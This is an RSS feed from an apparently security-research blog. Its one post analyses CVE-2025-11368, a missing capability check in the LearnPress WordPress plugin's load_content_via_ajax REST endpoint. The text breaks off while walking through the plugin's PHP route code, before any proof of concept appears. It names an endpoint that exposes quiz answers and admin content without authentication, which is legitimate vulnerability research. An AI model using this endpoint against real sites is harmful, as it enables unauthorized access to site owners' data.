<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Bui Van Y</title>
    <link>http://localhost:1313/</link>
    <description>Bui Van Y</description>
    <generator>Hugo 0.152.2 &amp; FixIt v0.4.0-alpha.3-20251128065536-6d00e42b</generator>
    <language>en</language>
    <managingEditor>w41bu1@gmail.com (Bui Van Y)</managingEditor>
    <webMaster>w41bu1@gmail.com (Bui Van Y)</webMaster>
    <lastBuildDate>Thu, 11 Dec 2025 19:00:00 +0700</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2025-11368 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-11-cve-2025-11368/</link>
      <pubDate>Thu, 11 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-11-cve-2025-11368/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;LearnPress – WordPress LMS Plugin&lt;/strong&gt; for &lt;strong&gt;WordPress&lt;/strong&gt; contains a &lt;strong&gt;Sensitive Information Disclosure&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;4.2.9.4&lt;/strong&gt;. The cause is the lack of &lt;strong&gt;capability checks&lt;/strong&gt; in the &lt;strong&gt;REST endpoint&lt;/strong&gt; &lt;strong&gt;/wp-json/lp/v1/load_content_via_ajax&lt;/strong&gt;, which allows execution of &lt;strong&gt;arbitrary callbacks&lt;/strong&gt; belonging to &lt;strong&gt;admin-only template methods&lt;/strong&gt;. This enables &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to obtain &lt;strong&gt;admin curriculum HTML&lt;/strong&gt;, &lt;strong&gt;quiz questions with correct answers&lt;/strong&gt;, &lt;strong&gt;course materials&lt;/strong&gt;, and other &lt;strong&gt;sensitive educational content&lt;/strong&gt; via the &lt;strong&gt;REST API endpoint&lt;/strong&gt;, as long as they supply &lt;strong&gt;valid numeric IDs&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11368&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11368&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.2.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/learnpress/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;LearnPress&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a REST API:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;LP_REST_AJAX_Controller&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;LP_Abstract_REST_Controller&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;namespace&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lp/v1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;rest_base&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;load_content_via_ajax&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;parent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;register_routes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;routes&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;s1&#34;&gt;&amp;#39;methods&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_REST_Server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ALLMETHODS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;s1&#34;&gt;&amp;#39;callback&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;get_content&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;s1&#34;&gt;&amp;#39;permission_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__return_true&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;parent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;register_routes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the code above, &lt;strong&gt;class LP_REST_AJAX_Controller&lt;/strong&gt; extends &lt;strong&gt;LP_Abstract_REST_Controller&lt;/strong&gt; and is used to register a &lt;strong&gt;REST API endpoint&lt;/strong&gt; for the &lt;strong&gt;LearnPress&lt;/strong&gt; plugin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;__construct()&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Sets the &lt;strong&gt;namespace&lt;/strong&gt; to &lt;code&gt;lp/v1&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Sets the &lt;strong&gt;rest_base&lt;/strong&gt; to &lt;code&gt;load_content_via_ajax&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Calls &lt;strong&gt;parent::__construct()&lt;/strong&gt; to inherit the parent class setup.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;register_routes()&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Declares a route &lt;code&gt;/&lt;/code&gt; with the following:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;methods&lt;/strong&gt;: accepts all HTTP methods (&lt;strong&gt;WP_REST_Server::ALLMETHODS&lt;/strong&gt;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;callback&lt;/strong&gt;: calls the &lt;code&gt;get_content&lt;/code&gt; function.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;permission_callback&lt;/strong&gt;: always returns &lt;code&gt;true&lt;/code&gt;, meaning &lt;strong&gt;no permission checks&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Calls &lt;strong&gt;parent::register_routes()&lt;/strong&gt; to complete registration.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;register_routes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;routes&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;routes&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$rest_base&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;rest_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$override&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_bool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$override&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$rest_base&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$rest_base&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span 